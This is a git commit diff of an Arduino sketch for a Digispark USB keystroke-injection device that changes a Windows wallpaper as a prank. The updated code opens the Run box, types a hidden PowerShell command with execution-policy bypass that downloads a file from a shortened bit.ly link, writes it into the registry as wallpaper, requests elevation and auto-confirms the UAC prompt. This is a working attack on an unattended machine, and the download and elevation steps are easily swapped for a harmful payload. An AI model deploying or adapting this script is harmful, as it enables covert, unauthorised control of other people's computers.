38d6e8eb08eff319e6f73f632285e6934cc2ca9f
Phoenixthrush UwU <mr.cetto@phoenixthrush.com>
2023-02-04 04:11:48 +0100

    Update wallpaper_changer.ino

--- wallpaper_changer.ino
+++ wallpaper_changer.ino
@@ -1,40 +1,22 @@
-// using the German-DigiKeyboard library (https://github.com/Phoenixthrush/DigistumpArduinoDe)
-#include <DigiKeyboardDe.h>
+#include <DigiKeyboard.h>
 
-// the setup routine runs once
-void setup() {  
+void setup() {        
   DigiKeyboard.update();
+  pinMode(1, OUTPUT);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   
-  // initialize the digital pin as an output.
-  pinMode(0, OUTPUT); //LED on Model B
-  pinMode(1, OUTPUT); //LED on Model A
-
-  // opening run box
-  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-
-  // opening powershell
-  DigiKeyboard.delay(300);
-  DigiKeyboardDe.println("powershell -noexit -c \"[console]::windowwidth=1; [console]::windowheight=1\"");
-
-  // waiting for powershell window
-  DigiKeyboard.delay(500);
-
-  // downloading wallpaper
-  DigiKeyboardDe.println("Invoke-WebRequest \"https://www.phoenixthrush.com/assets/images/random-images/chungus.jpg\" -OutFile \"wallpaper.jpg\"");
-
-  // setting registry key for new wallpaper
-  DigiKeyboardDe.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%userprofile%\\wallpaper.jpg\" /f");
-
-  // refreshing wallpaper
-  DigiKeyboardDe.println("RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters, 1, True; exit");
+  DigiKeyboard.delay(350);
+  DigiKeyboard.print("powershell -Win H -Exec Bypass; Invoke-WebRequest https://bit.ly/3HXY3jG -OutFile $env:TEMP\\sus.jpg; Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $env:TEMP\\sus.jpg; rundll32.exe user32.dll, UpdatePerUserSystemParameters;exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
+  
+  DigiKeyboard.delay(350);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
 }
 
-// the loop routine runs over and over again forever:
 void loop() {
-  digitalWrite(0, HIGH);  // turn the LED on (HIGH is the voltage level)
   digitalWrite(1, HIGH);
-  delay(100);             // wait for a second
-  digitalWrite(0, LOW);   // turn the LED off by making the voltage LOW
-  digitalWrite(1, LOW); 
-  delay(100);             // wait for a second
+  delay(250);
+  digitalWrite(1, LOW);   
+  delay(250);
 }
